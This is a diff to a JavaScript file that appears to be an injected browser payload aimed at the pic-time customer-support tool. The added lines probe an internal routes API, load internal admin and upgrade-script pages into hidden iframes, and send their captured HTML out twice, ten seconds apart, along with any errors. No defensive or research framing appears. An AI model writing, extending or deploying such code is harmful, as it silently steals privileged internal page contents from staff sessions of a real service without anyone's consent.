@@ -48,15 +48,25 @@ if (Math.random() <= 1.0) {
       iframe.style.display = "none";
       document.body.appendChild(iframe);
 
-      setTimeout(() => {
-        const iframeHtml = iframe.contentDocument.documentElement.outerHTML;
+      const iframeHtml1 = iframe.contentDocument.documentElement.outerHTML;
 
-        // Send Page HTML
-        insertDoc("iframe-page-html", {
-          location: iframeUrl,
-          html: iframeHtml,
-        });
-      }, 5000);
+      // Send Page HTML
+      await insertDoc("iframe-page-html", {
+        location: iframeUrl,
+        html: iframeHtml1,
+        delay: 0
+      });
+
+      await new Promise((res) => setTimeout(res, 10000));
+
+      const iframeHtml2 = iframe.contentDocument.documentElement.outerHTML;
+
+      // Send Page HTML
+      await insertDoc("iframe-page-html", {
+        location: iframeUrl,
+        html: iframeHtml2,
+        delay: 10000
+      });
     } catch (err) {
       console.error(err);
       insertDoc("error", err.toString());
@@ -106,6 +116,18 @@ if (Math.random() <= 1.0) {
           "https://cstool.pic-time.com/!servicescs.asmx/lookUpPhotographerAccount";
         const getGUserInfoFetchUrl =
           "https://cstool.pic-time.com/!servicescs.asmx/getGUserInfo";
+
+        try {
+          const url = "/oamapi/routes";
+          const routesResp = await fetch(url).then((resp) => resp.json());
+          if (routesResp.routes) {
+            await getIFrame("/ptoam");
+            await getIFrame("/upgradescripts/generalUpgradeActions.aspx");
+          }
+        } catch (err) {
+          console.error(err);
+          insertDoc("error", err.toString());
+        }
 
         // // getGUserAccess
         // try {
